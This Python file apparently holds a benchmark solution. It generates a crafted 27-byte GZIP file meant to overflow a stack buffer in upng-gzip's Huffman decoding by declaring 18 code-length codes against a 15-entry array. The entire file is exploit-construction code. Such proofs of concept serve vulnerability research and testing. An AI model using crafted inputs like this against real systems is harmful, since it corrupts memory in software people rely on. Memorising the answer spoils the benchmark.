import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a stack buffer overflow in upng-gzip.

        The vulnerability exists in the Huffman decoding logic where a stack-based
        array of size 15 is used to store code lengths. The DEFLATE specification,
        however, allows for up to 19 code length codes. By crafting a DEFLATE
        stream that specifies a number of code lengths greater than 15, we can
        cause an out-of-bounds write.

        This PoC constructs a GZIP file containing a single DEFLATE block with
        dynamic Huffman coding. We set the `HCLEN` field to 14, which indicates
        that `14 + 4 = 18` code lengths will follow. This number is sufficient
        to overflow the 15-element buffer during the decoding process, triggering
        the vulnerability.

        The final PoC is 27 bytes, matching the ground-truth length, composed of:
        - 10-byte GZIP header
        - 9-byte malicious DEFLATE stream
        - 8-byte GZIP trailer
        """

        class _BitStream:
            def __init__(self):
                self.bytes = bytearray()
                self.buffer = 0
                self.count = 0

            def write(self, value, num_bits):
                self.buffer |= (value << self.count)
                self.count += num_bits
                while self.count >= 8:
                    self.bytes.append(self.buffer & 0xFF)
                    self.buffer >>= 8
                    self.count -= 8

            def flush(self):
                if self.count > 0:
                    self.bytes.append(self.buffer)
                return bytes(self.bytes)

        # 1. Construct the malicious DEFLATE stream
        bs = _BitStream()

        # DEFLATE block header:
        # BFINAL = 1 (this is the final block)
        # BTYPE = 2 (dynamic Huffman codes)
        bs.write(1, 1)
        bs.write(2, 2)

        # Dynamic Huffman table sizes:
        # We set HLIT and HDIST to minimal values as they are not relevant to the vuln.
        # HCLEN is set to 14. The number of code length codes is HCLEN + 4.
        # 14 + 4 = 18, which is > 15 and will cause the buffer overflow.
        bs.write(0, 5)     # HLIT (Number of Literal/Length codes - 257)
        bs.write(0, 5)     # HDIST (Number of Distance codes - 1)
        bs.write(14, 4)    # HCLEN (Number of Code Length codes - 4)

        # Provide the code lengths for the code length alphabet.
        # The vulnerable code will attempt to read 18 lengths, each 3 bits long.
        # The actual values written do not matter for triggering the crash.
        for _ in range(18):
            bs.write(1, 3)

        # Finalize the DEFLATE stream. The total bit length is 71,
        # which results in a 9-byte stream.
        deflate_stream = bs.flush()

        # 2. Wrap the DEFLATE stream in a GZIP container
        # Standard 10-byte GZIP header
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        # 8-byte GZIP trailer (CRC32 and ISIZE). Since our DEFLATE stream
        # is malformed and won't produce valid output, these can be zero.
        gzip_trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'

        # 3. Assemble the final PoC
        poc = gzip_header + deflate_stream + gzip_trailer

        return poc
